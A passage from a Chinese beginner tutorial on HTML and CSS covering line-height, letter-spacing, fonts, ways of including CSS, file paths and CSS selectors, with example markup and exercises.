2007年，杭州市西湖风景名胜区被评为“国家AAAAA级旅游景区”。    &lt;/p&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>综合作业：</p><p>补全代码：</p><p><img src="https://qgt-document.oss-cn-beijing.aliyuncs.com/P3-1-HTML-CSS/1.5/5.3.3.png" alt="image"></p><pre><code>&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt;    &lt;meta charset="UTF-8"&gt;    &lt;title&gt;文字居中&lt;/title&gt;    &lt;link rel="stylesheet" href="./index.css"&gt;&lt;/head&gt;&lt;body&gt;    &lt;div class="container"&gt;        &lt;h3 style="color:#99f7e2;font-size:23px;text-align:left"&gt;Want to Start Conversation&lt;/h3&gt;        &lt;p style="color:#FFFFFF;font-size:8px;text-align:center"&gt;Reach out to us,if you need to learn more about            our company of get            our consulation and estimation of your            project.&lt;/p&gt;        &lt;a style="color:#FFFFFF;font-size:8px;text-align:center"&gt;CONTACT US&lt;/a&gt;    &lt;/div&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h3 id="5-4文字行高-字间距-字体"><a href="#5-4文字行高-字间距-字体" class="headerlink" title="5.4文字行高/字间距/字体"></a>5.4文字行高/字间距/字体</h3><h4 id="行高"><a href="#行高" class="headerlink" title="行高"></a>行高</h4><p><img src="https://qgt-document.oss-cn-beijing.aliyuncs.com/P3-1-HTML-CSS/1.5/%E8%A7%A3%E9%87%8A%E8%A1%8C%E9%AB%981.png" alt="image"></p><p>两行文字之间的距离就是由第一行文字下面的<code>4px</code>加上第二行上面的<code>4px</code>形成一个<code>8px</code>的间距，因此行高的大小决定了文字行与行之间的距离的大小。</p><p>行高的设置格式为:line-height:30px</p><p>其作用为：</p><p><strong>第一个作用：改变段落中行与行之间的距离</strong></p><p>默认的行高未必满足我们需要的效果</p><p>例子：</p><pre><code>&lt;p&gt;  We understand every aspect of project and we put a great amount of time in  understanding the project.&lt;/p&gt;&lt;p style="line-height:32px;"&gt;  We understand every aspect of project and we put a great amount of time in  understanding the project.&lt;/p&gt;</code></pre><p><strong>第二个作用：使文字上下居中</strong></p><p>如下图随着行高的变化，文字的位置也在不断变化，当行高的矩形的高度一样的时候，文字在矩形中上下居中</p><blockquote><p>例如，文字外面的举行高度为80px，要让文字在举行中上下居中，就要设置文字的行高为80px</p></blockquote><p><img src="https://qgt-document.oss-cn-beijing.aliyuncs.com/P3-1-HTML-CSS/1.5/%E4%BD%BF%E7%94%A8%E8%A1%8C%E9%AB%98%E5%B1%85%E4%B8%AD1.png" alt="image"></p><p>演示一个文字居中的按钮：<br>为了美观，背景颜色和圆角我们在index.css中写出</p><pre><code>&lt;button  style="width: 120px;height:50px;text-align: center;line-height:50px;color:white;font-size: 18px;"&gt;  提交&lt;/button&gt;</code></pre><h4 id="字间距"><a href="#字间距" class="headerlink" title="字间距"></a>字间距</h4><p>即文字之间的距离，但中文和英文的字间距是不一样的</p><ul><li>英文的字间距是每个字母之间的距离，单词和单词之间的距离不属于字间距</li><li>中文是每个汉字之间的距离</li></ul><p>格式为：letter-spacing:30px</p><pre><code>&lt;p style="font-size: 25px;font-weight: 700;letter-spacing:30px;"&gt;设置字体的粗细和间距&lt;/p&gt;</code></pre><h4 id="字体"><a href="#字体" class="headerlink" title="字体"></a>字体</h4><p>我们如何去设置字体呢？</p><p>关键字＋值即可</p><p><code>font-family: sans-serif</code></p><p>我们设置的字体能否被应用取决于使用者的电脑有没有安装这个字体，所以网页中会使用一些常见的字体，这样子网站的兼容性就更好了</p><p>有些网站比较个性化就会多设置几个字体，比如：</p><pre><code>font-family: 'Goudy Bookletter 1911', sans-serif, Gill Sans Extrabold;</code></pre><p>这段代码的意思就是页面加载以后先去找代码设置的字体，这里有三个备选的字体，浏览器会顺序加载，首先看“Goudy Bookletter 1911”有没有安装，如果没有就会去查看第二个字体，以此类推，如果都没有安装，那么这个字体就是使用默认的微软字体，此字体为所有电脑默认安装。</p><p><strong>练习：</strong><br><img src="https://qgt-document.oss-cn-beijing.aliyuncs.com/P3-1-HTML-CSS/1.5/5.4.3zuoye.png" alt="image"></p><pre><code>&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt;    &lt;meta charset="UTF-8"&gt;    &lt;title&gt;作业1&lt;/title&gt;    &lt;link rel="stylesheet" href="index.css"&gt;&lt;/head&gt;&lt;body&gt;    &lt;div class="container"&gt;        &lt;div&gt;&lt;/div&gt;        &lt;div&gt;            &lt;span style="font-size:20px;color:#FFFFFF;line-height:30px"&gt;Hi&lt;/span&gt;            &lt;h3 style="font-size:56px;color:#FFFFFF;line-height:60px"&gt;My name is Alex&lt;/h3&gt;            &lt;p style="font-size:28px;color:#FFFFFF;line-height:45px"&gt;                I am a product designer in Flexo. It is a high-quality UI kit which you can use to design a personal                website or portfolio.            &lt;/p&gt;            &lt;a style="font-size:18px;color:#FFFFFF"&gt;SEE MY PROJECTS&lt;/a&gt;        &lt;/div&gt;    &lt;/div&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h2 id="第六章：CSS引入方式"><a href="#第六章：CSS引入方式" class="headerlink" title="第六章：CSS引入方式"></a>第六章：CSS引入方式</h2><h3 id="6-1-CSS的三种引入方式"><a href="#6-1-CSS的三种引入方式" class="headerlink" title="6.1 CSS的三种引入方式"></a>6.1 CSS的三种引入方式</h3><h4 id="1-行内样式"><a href="#1-行内样式" class="headerlink" title="1.行内样式"></a>1.行内样式</h4><p>通过图画来理解第一种<code>CSS</code>的引入方式，<strong>行内式</strong></p><p><img src="https://qgt-document.oss-cn-beijing.aliyuncs.com/P3-1-HTML-CSS/1.6/line-style-css.png" alt="image"></p><p>行内样式需要内嵌在每一个<code>HTML</code>标签中，所以当我们有几百行<code>HTML</code>标签时我们就需要写几百个<code>style</code>，实际上在前面设置字体样式的时候，肯定会觉得繁琐，比如：</p><pre><code>&lt;p style="font-size: 18px;font-weight: 700;color: blue;"&gt;  这是一个p标签，和第三个p标签样式一样&lt;/p&gt;&lt;p&gt;这是一个中立的p标签&lt;/p&gt;&lt;p style="font-size: 18px;font-weight: 700;color: blue;"&gt;  这是一个p标签，和第一个p标签样式一样&lt;/p&gt;</code></pre><p>明明两个样式是一样的，我们不得不重新写一次。</p><p>因此，我们就要想办法把每一个标签中的<code>CSS</code>样式提取出来，抽取成一整段，放在<code>HTML</code>文件中的某个位置。这时候我们需要了解第二种引入方式——<strong>内部样式</strong></p><h4 id="2-内部样式"><a href="#2-内部样式" class="headerlink" title="2.内部样式"></a>2.内部样式</h4><p>用一张图来介绍内部样式的抽离过程：<br><img src="https://qgt-document.oss-cn-beijing.aliyuncs.com/P3-1-HTML-CSS/1.6/head-style-css.png" alt="image"></p><p>抽离步骤：</p><ol><li>首先我们将每一个标签里的<code>CSS</code>样式抽取出来</li><li>然后再<code>head</code>标签里声明了一个<code>&lt;style&gt;&lt;/style&gt;</code>标签</li><li>接下来将样式都放在<code>style</code>标签里，注意这里不是简单的复制粘贴</li></ol><p><img src="https://qgt-document.oss-cn-beijing.aliyuncs.com/P3-1-HTML-CSS/1.6/%E5%A4%B4%E9%83%A8%E6%A0%B7%E5%BC%8F%E6%8A%BD%E7%A6%BB.png" alt="image"></p><ol start="4"><li>将相同标签的样式写在相同的打括号里<code>{}</code>，大括号前面加上标签名，形如：</li></ol><pre><code>p {  font-size: 16px;  color: #ffffff;}</code></pre><p>书写规则：<br><img src="https://qgt-document.oss-cn-beijing.aliyuncs.com/P3-1-HTML-CSS/1.6/%E6%A0%B7%E5%BC%8F%E9%87%8D%E7%82%B9%E8%A7%A3%E9%87%8A.png" alt="image"></p><ul><li>不要忘记声明标签<code>&lt;style&gt;&lt;/style&gt;</code></li><li>样式要用花括号括起来</li><li>每个样式后面要用分号结尾</li></ul><p>example：</p><pre><code>&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt;    &lt;meta charset="UTF-8"&gt;    &lt;title&gt;内部样式演示&lt;/title&gt;&lt;style&gt;  /*给h3标签添加样式*/  h3{    font-size:28px;    color:#333;    letter-spacing:5px;  }    /*给p标签添加CSS样式*/    p{      font-size:12px;      color:#666;    }&lt;/style&gt;&lt;/head&gt;&lt;body&gt;    &lt;!-- 添加一个h3标题标签 --&gt;    &lt;h3&gt;练习内部样式&lt;/h3&gt;    &lt;!-- 添加一个p标签 --&gt;    &lt;p&gt;内部样式就是将HTML标签和CSS的样式文件分离开来&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h4 id="外部样式"><a href="#外部样式" class="headerlink" title="外部样式"></a>外部样式</h4><p>随着代码量的逐渐增多，整个<code>HTML</code>文件就会呈现头重脚轻的现象，即<code>CSS</code>代码要比<code>HTML</code>代码多得多，这样很不利于阅读和复查代码，更重要的是为了实现代码的分离，让<code>HTML</code>负责结构，<code>CSS</code>代码负责样式</p><p>所以我们要进行进一步分离</p><p><img src="https://qgt-document.oss-cn-beijing.aliyuncs.com/P3-1-HTML-CSS/1.6/%E5%A4%96%E9%83%A8%E6%A0%B7%E5%BC%8F%E5%BC%95%E5%85%A5%E6%AD%A5%E9%AA%A4.png" alt="image"></p><p>步骤：</p><ul><li>新建一个<code>index.css</code>文件</li><li>将html代码头部中的<code>style</code>标签内的样式全部拷贝过来</li><li>将复制的<code>CSS</code>样式粘贴进index.css文件中</li><li>建立<code>html</code>和<code>CSS</code>文件的联系，即用<code>link</code>标签引入<code>CSS</code>文件</li></ul><blockquote><p>注意这里的link变迁引入的位置一定要在head标签内；关于引入的时候<code>./</code>什么意思，下一节再说</p></blockquote><p>演示以下整个文件分离的过程：</p><p>HTML：</p><pre><code>&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt;    &lt;meta charset="UTF-8"&gt;    &lt;title&gt;外部样式&lt;/title&gt;    &lt;!-- 引入外部index.css文件 --&gt;    &lt;link rel="stylesheet" href="./index.css"&gt;&lt;/head&gt;&lt;body&gt;    &lt;h3&gt;练习外部样式&lt;/h3&gt;    &lt;p&gt;内部样式就是将HTML标签和CSS的样式文件分离开来&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h4 id="补充知识点"><a href="#补充知识点" class="headerlink" title="补充知识点"></a>补充知识点</h4><p>前文中我们知道HTML的注释方式是<code>&lt;!--内容--&gt;</code>,再CSS代码中的注释方式跟HTML中是不同的，格式为<code>/*CSS注释内容*/</code></p><p>CSS的注释位置</p><p><strong>1.内部样式注释</strong></p><pre><code>&lt;style&gt;/* 写CSS的基础样式 */.base{  /* 基础字体大小 */  font-size: 14px;  /* 基础字体颜色 */  color:#000000;}&lt;/style&gt;</code></pre><p><strong>2.外部样式注释</strong></p><p>直接在<code>.CSS</code>文件中注释即可</p><pre><code>/* 写CSS的基础样式 */.base {  /* 基础字体大小 */  font-size: 14px;  /* 基础字体颜色 */  color: #000000;}</code></pre><p><strong>link</strong></p><pre><code>&lt;link rel="stylesheet" type="text/css" href="index.css" /&gt;</code></pre><ol><li><code>rel</code>属性规定了当前文档与被链接文档之间的关系，但是<code>rel</code>属性的<code>stylesheet</code>值被所有浏览器支持，也就是说你只要记住一个值即可</li></ol><p><code>stylesheet</code>的意思就是文档的外部样式表</p><ol start="2"><li><code>type</code>属性规定了被链接文档的MIME（多用途互联网邮件扩展类型）,<code>type</code>属性对应的常见的值就是<code>text/css</code>，该类型描述样式表</li><li><code>herf</code>属性后跟的是要引入的链接地址</li></ol><p>练习：</p><pre><code>&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt;    &lt;meta charset="UTF-8"&gt;    &lt;title&gt;外部样式&lt;/title&gt;    &lt;link rel="stylesheet" href="./index.css"&gt;&lt;/head&gt;&lt;body&gt;    &lt;h3&gt;小猴子M5&lt;/h3&gt;    &lt;p&gt;小猴子电摩电动车新款改装z6小怪兽电瓶车m3m5电动摩托车男女成人电动车72v代步车 改装版套餐三含72v32安超威电池&lt;/p&gt;    &lt;a href="#"&gt;点击进入详情页&lt;/a&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h3 id="6-2相对路径-绝对路径"><a href="#6-2相对路径-绝对路径" class="headerlink" title="6.2相对路径/绝对路径"></a>6.2相对路径/绝对路径</h3><h4 id="绝对路径"><a href="#绝对路径" class="headerlink" title="绝对路径"></a><strong>绝对路径</strong></h4><p>绝对路径指的是文件在硬盘上真正存放的路径，例如我们引入电脑E盘的图片，用绝对路径这样写</p><pre><code>&lt;img src="E:\book\网页布局\bg.jpg" /&gt;</code></pre><p>但是有一个问题，当你的项目拷贝到其他同学的电脑上的时候，你会发现你引入的文件或者图片不见了。因为你同学的电脑E盘下根本不存在文件。</p><blockquote><p>因此我们要尽量避免使用绝对路径</p></blockquote><h4 id="相对路径"><a href="#相对路径" class="headerlink" title="相对路径"></a><strong>相对路径</strong></h4><p>为了避免绝对路径造成的页面资源丢失现象，在引入外部资源的时候我们都会选择使用相对路径</p><blockquote><p>所谓相对路径就是相对于文件本身位置，去寻找要引入的资源文件</p></blockquote><p>掌握：</p><ul><li><code>./</code>：当前文件夹目录，比如在下面这个目录结构下（test文件下有index.css和index.html两个文件），要在index.html中引入index.cxx就需要用到<code>./</code></li></ul><p><img src="https://qgt-document.oss-cn-beijing.aliyuncs.com/P3-1-HTML-CSS/1.6/dangqianmulu.png" alt="image"></p><p>具体写法如下：</p><pre><code>&lt;link rel="stylesheet" href="./index.css"&gt;&lt;!-- 或者./去掉也可以，效果是一样的 --&gt;&lt;link rel="stylesheet" href="index.css"&gt;</code></pre><ul><li><code>../</code>：回到上一级目录，比如下面(index.html再test文件夹里面，index.cxx和test文件夹在同一目录下)，我们要在index.html中引入index.css文件，首先要从index.html文件所在目录即test文件夹里出来，才能找到index.css，从某个文件夹俩面出来，就要用到<code>../</code></li></ul><p>比如：<br><img src="https://qgt-document.oss-cn-beijing.aliyuncs.com/P3-1-HTML-CSS/1.6/fanhuishangyijimulu.png" alt="image"></p><p>具体写法：</p><pre><code>&lt;link rel="stylesheet" href="../index.css"&gt;</code></pre><blockquote><p>用绝对路径记住三点：</p><ul><li>找到引用资源的文件所在位置，以引用资源的文件作为基准寻找资源</li><li>../返回一层，如果有多层，舅用多个../，比如返回两层舅用../../</li><li>文件夹名代表进入该文件加，例如css/,表示进入css文件夹，比如从test文件夹里出来进入css文件夹找到index.css文件，可以这样写../css/index.css</li></ul></blockquote><h3 id="6-3常用选择器"><a href="#6-3常用选择器" class="headerlink" title="6.3常用选择器"></a>6.3常用选择器</h3><h4 id="标签选择器"><a href="#标签选择器" class="headerlink" title="标签选择器"></a>标签选择器</h4><p>标签选择器：使用标签的名字将标签选中，然后给标签中的文字设置字体样式</p><p>如下图：选中所有叫<code>p</code>的标签，然后就可以统一给所有的<code>p</code>标签设置样式</p><p><img src="https://qgt-document.oss-cn-beijing.aliyuncs.com/P3-1-HTML-CSS/1.6/xuanzeqi-1.png" alt="image"></p><p>今后我们还会接触很多其他的选择器，记住选择器的作用就是选中，因为只有选中了以后，才能去对用的作出修改。接下来我们理解选择器的好处——<strong>减少代码量</strong></p><p>案例：最初的行内样式</p><pre><code>&lt;h3 style="font-size: 25px;color: #330867;"&gt;孟航沛&lt;/h3&gt;&lt;h4 style="font-size: 18px;color: #30cfd0;"&gt;平面设计师&lt;/h4&gt;&lt;p style="font-size: 14px;line-height: 28px;color: #4a5252"&gt;  专业综合性强，具有较强的综合能力，学习认真刻苦，虽然我的专业是思想政治教育，  但是我们所学的除了马克思主义的相关理论之外，同时还学习了管理学、心理学和法学的相关理论知识，  专业具有较强的综合性，使我具备较强的综合能力，基本能够胜任行政设计师助力这个岗位。&lt;/p&gt;</code></pre><p>现在我们将行内样式抽离出来，写在头部，即内部样式：</p><pre><code>&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;  &lt;head&gt;    &lt;meta charset="UTF-8" /&gt;    &lt;title&gt;标签选择器&lt;/title&gt;    &lt;style&gt;      h3 {        font-size: 25px;        color: #330867;      }      h4 {        font-size: 18px;        color: #30cfd0;      }      p {        font-size: 14px;        line-height: 28px;        color: #4a5252;      }    &lt;/style&gt;  &lt;/head&gt;  &lt;body&gt;    &lt;h3&gt;孟航沛&lt;/h3&gt;    &lt;h4&gt;平面设计师&lt;/h4&gt;    &lt;p&gt;      专业综合性强，具有较强的综合能力，学习认真刻苦，虽然我的专业是思想政治教育，      但是我们所学的除了马克思主义的相关理论之外，同时还学习了管理学、心理学和法学的相关理论知识，      专业具有较强的综合性，使我具备较强的综合能力，基本能够胜任行政设计师助力这个岗位。    &lt;/p&gt;  &lt;/body&gt;&lt;/html&gt;</code></pre><h4 id="选择器的层叠性"><a href="#选择器的层叠性" class="headerlink" title="选择器的层叠性"></a>选择器的层叠性</h4><p>在写<code>CSS</code>样式的时候，有的时候因为粗心，之前写过的标签又会重写一次，然后给{}里面添加样式，这样做可能会造成两种结果</p><ol><li>添加新的效果（如果添加的是一个新属性）</li><li>改变之前已经存在的效果（如果该属性之前就存在）</li></ol><p>如：</p><pre><code>h3 {  font-size: 25px;  color: #330867;}h4 {  font-size: 18px;  color: #30cfd0;}p {  font-size: 14px;  line-height: 28px;  color: #4a5252;}/*在这里写一个同名标签名h3,所以你只要关注“孟航沛”的变化即可*/h3 {  /*font-weight属性在之前的h3标签里没有写，那么这里就会添加新的效果*/  font-weight: 700;  /*color这个属性前面已经定义了，这里再写，就会覆盖前面的字体颜色*/  color: red;}</code></pre><h4 id="类选择器"><a href="#类选择器" class="headerlink" title="类选择器"></a>类选择器</h4><p>在前面的标签选择器中我们通过标签选择器将很多重复的模块批量化的设置了它们的样式，但是在实际应用中，仅仅一个小标签选择器还不足以满足我们日常的开发需求；</p><p>比如说，在一个标签选择器的案例中，我们是否想过，给”左小青”设置一个特殊的颜色呢？此时的标签选择器的功能就不足以实现我们预期的效果</p><p>那么我们先来了解一下类选择器的定义和使用</p><p><strong>定义</strong></p><pre><code>&lt;p class="article"&gt;  class是定义类的关键字，article是类名，类名可以任意，但是要符合规范&lt;/p&gt;</code></pre><p>class是定义的关键字，article是类名，类名可以任意，但是要符合规范</p><p><strong>使用</strong></p><pre><code>.article {  color: red;  font-size: 14px;}</code></pre><p>如果是内部样式，上面的代码就要写在<code>&lt;style&gt;&lt;/style&gt;</code>标签之间，如果是外部样式则要直接写在<code>.css</code>文件中。</p><p>类选择器的作用就是在普通中寻找特别，下面我们就来实现上面的需求，给“左小青”设置一个特殊的颜色</p><pre><code>&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt;    &lt;meta charset="UTF-8"&gt;    &lt;title&gt;QQ&lt;/title&gt;    &lt;style&gt;        /* 给h3标签添加样式 */        h3 {            font-size: 25px;            color: #330867;        }        /* 给h4标签添加样式 */        h4 {            font-size: 18px;            color: #30cfd0;        }        /* 给p标签添加样式 */        p {            font-size: 14px;            line-height: 28px;            color: #4a5252        }      /*通过类名修改“左小青”的字体颜色（注意，这里用到了层叠性）*/      .special-title{          color:skyblue;      }      }    &lt;/style&gt;&lt;/head&gt;&lt;body&gt;    &lt;h3&gt;孟航沛&lt;/h3&gt;    &lt;h4&gt;平面设计师&lt;/h4&gt;    &lt;p&gt;专业综合性强，具有较强的综合能力，学习认真刻苦，虽然我的专业是思想政治教育，但是我们所学的除了马克思主义的相关理论之外，同时还学习了管理学、心理学和法学的相关理论知识，专业具有较强的综合性，使我具备较强的综合能力，基本能够胜任行政设计师助力这个岗位。    &lt;/p&gt;    &lt;h3&gt;江晓风&lt;/h3&gt;    &lt;h4&gt;UI&lt;/h4&gt;    &lt;p&gt;专业综合性强，具有较强的综合能力，学习认真刻苦，虽然我的专业是思想政治教育，但是我们所学的除了马克思主义的相关理论之外，同时还学习了管理学、心理学和法学的相关理论知识，专业具有较强的综合性，使我具备较强的综合能力，基本能够胜任行政设计师助力这个岗位。    &lt;/p&gt;      &lt;!--添加类名--&gt;      &lt;h3 class="special-title"&gt;左小青&lt;/h3&gt;    &lt;h4&gt;插画师&lt;/h4&gt;    &lt;p&gt;专业综合性强，具有较强的综合能力，学习认真刻苦，虽然我的专业是思想政治教育，但是我们所学的除了马克思主义的相关理论之外，同时还学习了管理学、心理学和法学的相关理论知识，专业具有较强的综合性，使我具备较强的综合能力，基本能够胜任行政设计师助力这个岗位。    &lt;/p&gt;    &lt;h3&gt;蒋小鱼&lt;/h3&gt;    &lt;h4&gt;Java工程师&lt;/h4&gt;    &lt;p&gt;专业综合性强，具有较强的综合能力，学习认真刻苦，虽然我的专业是思想政治教育，但是我们所学的除了马克思主义的相关理论之外，同时还学习了管理学、心理学和法学的相关理论知识，专业具有较强的综合性，使我具备较强的综合能力，基本能够胜任行政设计师助力这个岗位。    &lt;/p&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>除此之外，一个标签上面还可以添加多个类名，类名之间要用空格隔开，比如这样</p><pre><code>&lt;p class="common color font-size"&gt;  common设置通用样式，color设置特殊颜色，font-size设置特殊字体大小&lt;/p&gt;</code></pre><p>案例：</p><pre><code>&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt;    &lt;meta charset="UTF-8"&gt;    &lt;title&gt;多个类名&lt;/title&gt;    &lt;style&gt;        li {            list-style: none;        }    /*在这里书写通用样式*/    .common{      font-size: 22px;      color: #333333;      letter-spacing: 8px;    }    /*在这里书写特殊样式*/    .current{      color:#FF6973;    }    &lt;/style&gt;&lt;/head&gt;&lt;body&gt;    &lt;ul&gt;        &lt;li class="common"&gt;白日依山尽，&lt;/li&gt;        &lt;li class="common current"&gt;黄河入海流。&lt;/li&gt;        &lt;li class="common"&gt;欲穷千里目，&lt;/li&gt;        &lt;li class="common"&gt;更上一层楼。&lt;/li&gt;    &lt;/ul&gt;    &lt;ul&gt;        &lt;li&gt;松下问童子，&lt;/li&gt;        &lt;li&gt;言师采药去。&lt;/li&gt;        &lt;li&gt;只在此山中，&lt;/li&gt;        &lt;li&gt;云深不知处。&lt;/li&gt;    &lt;/ul&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>解释一下上面的案例</p><ul><li>为什么不用标签选择器，而要在4个<code>li</code>标签上添加类名呢？因为如果用<code>li</code>标签会在第二首诗也选中，而我们只要求选中一首</li><li>前面我们学过的选择器的层叠性，那么这里是<code>class="common current"</code>类名的先后顺序影响最终样式呢？还是<code>&lt;style&gt;&lt;/style&gt;</code>标签中的类名先后顺序影响结果呢？将<code>class="common current"</code>改为<code>class="current common"</code>不会影响页面效果</li></ul><p>将</p><pre><code>.common {  font-size: 22px;  color: #333333;  letter-spacing: 8px;}.current {  color: #ff6973;}</code></pre><p>改为</p><pre><code>.current {  color: #ff6973;}.common {  font-size: 22px;  color: #333333;  letter-spacing: 8px;}</code></pre><p><code>.current</code>中的颜色会被<code>.common</code>中的颜色层叠掉</p><h4 id="id选择器"><a href="#id选择器" class="headerlink" title="id选择器"></a>id选择器</h4><p>在标签中定义id</p><pre><code>&lt;p id="p-item"&gt;这是一段文字&lt;/p&gt;</code></pre><p>使用id选择器</p><pre><code>#p-item {  font-size: 24px;  font-weight: 400;}</code></pre><p>注意：</p><ol><li>id选择器在文档中只会出现一次，像下面这种使用方式是不对的：</li></ol><pre><code>&lt;a href="#" id="link"&gt;点击进入详情&lt;/a&gt;&lt;!-- link这个id名已经被使用，就不可以再次定义 --&gt;&lt;a href="#" id="link"&gt;点击进入主页&lt;/a&gt;</code></pre><p>id就像身份证号码一样，全国只能有一个，同样id选择器也一样，这里的link重复了</p><ol start="2"><li>不能像类选择器一样，一个标签上定义多个id名，像下面这样是错误的</li></ol><pre><code>&lt;a href="#" id="link linkto"&gt;点击进入详情页&lt;/a&gt;</code></pre><p>id选择器在写页面的时候用的不是很广泛，其性质与类选择器也相似。</p><h4 id="高级选择器"><a href="#高级选择器" class="headerlink" title="高级选择器"></a>高级选择器</h4><p>常用的高级选择器有四种：</p><ul><li>后代选择器</li><li>交集选择器</li><li>子选择器</li><li>并集选择器</li></ul><h4 id="1-后代选择器（空格）"><a href="#1-后代选择器（空格）" class="headerlink" title="1.后代选择器（空格）"></a>1.后代选择器（空格）</h4><p><code>p a</code>————选择所有p标签内的a标签</p><p>后代选择器的书写规则：用空格隔开，例如：</p><pre><code>/* 选择id名为password的标签内部所有类名为box的元素内部的所有p标签 */#password .box p{}/* 选择所有p标签内部的所有span标签 */p span{}/* 选择所有p标签内部的所有类名为spanItem的标签 */p .spanItem{}</code></pre><p>案例：</p><pre><code>&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt;    &lt;meta charset="UTF-8"&gt;    &lt;title&gt;案例&lt;/title&gt;    &lt;style&gt;ul li{  list-style: none;  font-size: 22px;}    .first-ul li{      color: rgb(212, 166, 28);    }    .second-ul li {      color: rgb(230, 127, 122);    }    &lt;/style&gt;&lt;/head&gt;&lt;body&gt;    &lt;ul class="first-ul"&gt;        &lt;li&gt;苍苍竹林寺，杳杳钟声晚。&lt;/li&gt;        &lt;li&gt;荷笠带斜阳，青山独归远。&lt;/li&gt;    &lt;/ul&gt;    &lt;ul class="second-ul"&gt;        &lt;li&gt;白日依山尽，黄河入海流。&lt;/li&gt;        &lt;li&gt;欲穷千里目，更上一层楼。&lt;/li&gt;    &lt;/ul&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>以上可以看出抽离的编程思想，将<code>li</code>标签公有的属性抽离在<code>ul li</code>选择器内，因为这个选择器选中的是所有的<code>li</code>,然后再分别用<code>.first-ul</code>和<code>.second-ul li</code>选择器来设置不同的属性。</p><pre><code>.first-ul li {    list-style: none;    font-size: 22px;    color: rgb(212, 166, 28);}.second-ul li {    list-style: none;    font-size: 22px;    color: rgb(230, 127, 122);}</code></pre><p>随着经验的不断积累，我们要慢慢的思考着抽离</p><p><strong>重点理解后代</strong></p><p>什么是后代</p><pre><code>&lt;ul&gt;父    &lt;li&gt;子        &lt;p&gt;孙            &lt;span&gt;曾孙                &lt;a href=""&gt;曾曾孙&lt;/a&gt;            &lt;/span&gt;        &lt;/p&gt;    &lt;/li&gt;&lt;/ul&gt;</code></pre><p>这段代码中，标签和中签当中就形成了子代关系a、span、p、li就是ul标签的后代,li既是ul的后代又是ul的子元素</p><p>要选中上段代码的a标签，可以有</p><pre><code>/* 方法一： */a{}/* 方法二 */ul a{}/* 方法三 */ul li p a{}/* 方法四 */ul li p span a{}</code></pre><p>具体选择什么要看具体的情况</p><pre><code>&lt;ul&gt;父    &lt;li&gt;子        &lt;p class="p-one"&gt;孙            &lt;span&gt;曾孙                &lt;a href=""&gt;曾曾孙1&lt;/a&gt;            &lt;/span&gt;        &lt;/p&gt;        &lt;p class="p-two"&gt;孙            &lt;span&gt;曾孙                &lt;a href=""&gt;曾曾孙2&lt;/a&gt;            &lt;/span&gt;        &lt;/p&gt;    &lt;/li&gt;&lt;/ul&gt;</code></pre><p>此时我们用上面的四种方法都会选到两个a标签，但是我们的目的是选中“曾曾孙1”，所以我们要在最开始出现重复标签的那一级来做区分，给这一级分别加上类名，或者你可以只给你需要的那个标签添加类名即可，我们要选中“曾曾孙1”可以这样做：</p><pre><code>/* 方法一 */ul li .p-one span a{}/* 方法二 */.p-one span a{}</code></pre><h4 id="2-交集选择器"><a href="#2-交集选择器" class="headerlink" title="2.交集选择器"></a>2.交集选择器</h4><p>书写规则</p><p><code>a.special{}</code></p><pre><code>&lt;a href="#" class="special"&gt;超链接&lt;/a&gt;&lt;a href="#"&gt;超链接&lt;/a&gt;&lt;a href="#"&gt;超链接&lt;/a&gt;&lt;a href="#"&gt;超链接&lt;/a&gt;</code></pre><p>案例：</p><pre><code>&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt;    &lt;meta charset="UTF-8"&gt;    &lt;title&gt;案例&lt;/title&gt;    &lt;style&gt;      ul li {        list-style: none;        font-size: 22px;      }    ul li a {      /* 去除a标签的下划线 */      text-decoration: none;      /* 这里的颜色一定要在a标签上设置，因为a标签默认会去设置字体颜色，会层叠掉默认的黑色 */      color: black;    }    ul li a.special {      color: orangered;    }    &lt;/style&gt;&lt;/head&gt;&lt;body&gt;    &lt;ul&gt;        &lt;li&gt;&lt;a href="" class="special"&gt;电子产品&lt;/a&gt;&lt;/li&gt;        &lt;li&gt;&lt;a href=""&gt;家居服饰&lt;/a&gt;&lt;/li&gt;        &lt;li&gt;&lt;a href=""&gt;电竞手办&lt;/a&gt;&lt;/li&gt;        &lt;li&gt;&lt;a href="" class="special"&gt;家装服务&lt;/a&gt;&lt;/li&gt;        &lt;li&gt;&lt;a href=""&gt;房屋出租&lt;/a&gt;&lt;/li&gt;    &lt;/ul&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h4 id="3-子选择器"><a href="#3-子选择器" class="headerlink" title="3.子选择器"></a>3.子选择器</h4><p>与后代选择器类似，不同的是后代选择器突出的是“后代“，子选择器突出的是”子“。</p><h4 id="4-并集选择器"><a href="#4-并集选择器" class="headerlink" title="4.并集选择器"></a>4.并集选择器</h4><p>如果要给不同的标签，或者不同类名的标签添加相同的样式，此时就要用到并集选择器，并集选择器的规则是在标签名或者类名后面用逗号(，)隔开，例<br>如:</p><pre><code>.box,p,h3,.phone{}</code></pre><p>并集选择器的作用是–“和”，上面这段代码的意思就是给类名为<code>box</code>、|<code>phone</code> 标签名为<code>p</code>、| <code>h3</code><br>的标签添加相同的属性。</p><p>有了前面的选择器基础,相信并集选择器大家都可以理解.</p><p>练习：</p><p>实现下列效果</p><p>设计图：<br><img src="https://qgt-document.oss-cn-beijing.aliyuncs.com/P3-1-HTML-CSS/1.6/6-4-2%E4%BD%9C%E4%B8%9A%E6%A0%87%E6%B3%A8.png" alt="image"></p><p>要求：尽量使用高级选择器来实现页面效果</p><p>css文件：</p><pre><code>ul,li {    list-style: none;    padding: 0;    